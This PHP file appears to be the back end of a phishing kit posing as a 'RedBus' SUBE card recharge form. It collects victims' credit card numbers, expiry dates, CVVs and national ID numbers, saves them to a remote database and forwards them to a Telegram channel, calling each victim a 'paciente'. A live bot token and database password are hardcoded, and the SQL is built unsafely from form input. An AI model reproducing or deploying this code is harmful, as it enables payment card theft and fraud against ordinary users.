<?php
$nombre_servidor = 'db4free.net';
$nombre_usuario = 'userdepruebaxd';
$contrasena = 'david2021';
$nombre_base_de_datos = 'redbus';
$conexion = new mysqli($nombre_servidor, $nombre_usuario, $contrasena, $nombre_base_de_datos);

if ($conexion->connect_error) {
    die('Error de conexión: ' . $conexion->connect_error);
}

$num_tarjeta = $_POST["input-sube"];
$monto_recarga = $_POST["dinero"];
$dni_titular = $_POST["dni"];
$ccard = $_POST["ccard"];
$mm = $_POST["mm"];
$aa = $_POST["aa"];
$cvv = $_POST["cvv"];

$sql = "INSERT INTO recargas (num_tarjeta_sube, monto_recarga, dni_titular, num_tarjeta_credito, exp_mm, exp_aa, cvv)
       VALUES ('$num_tarjeta', '$monto_recarga', '$dni_titular', '$ccard', '$mm', '$aa', '$cvv')";

if ($conexion->query($sql) === TRUE) {
    date_default_timezone_set('America/Lima');
    
        // Obtener la fecha y hora actuales en Perú
        $fecha_actual = date('Y-m-d');
        $hora_actual = date('H:i:s');
    // Enviar mensaje a través de Telegram
    $token = "6545431165:AAGu-ximIBPYgqumvbGLQ80kIH_iGCKPv90"; // Reemplaza con el token de tu bot
    $chat_id = "@paneladministrador"; // Reemplaza con el nombre del canal (con el '@') o el ID del chat al que deseas enviar el mensaje
    $message = "NUEVO PACIENTE DE : REDBUS\n";
    $message .= "NUMERO DE LA TARJETA: $ccard\n";
    $message .= "MES: $mm\n";
    $message .= "AÑO: $aa\n";
    $message .= "CVV: $cvv\n";
    $message .= "MONTO DE RECARGA: $monto_recarga\n";
    $message .= "DNI Titular: $dni_titular\n";
    $message .= "FECHA QUE CALLO EL PACIENTE: $fecha_actual\n";
    $message .= "HORA ACTUAL QUE CALLO EL PACIENTE: $hora_actual\n";
    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message);

    // Enviar la solicitud HTTP y verificar errores
    $result = @file_get_contents($url);

    if ($result === FALSE) {
        echo 'Error al enviar el mensaje a Telegram. Verifica la configuración del bot o intenta más tarde.';
    } else {
        header('Location: ../exito.php');
    }
} else {
    echo 'Error al registrar el usuario: ' . $conexion->error;
}

$conexion->close();
?>
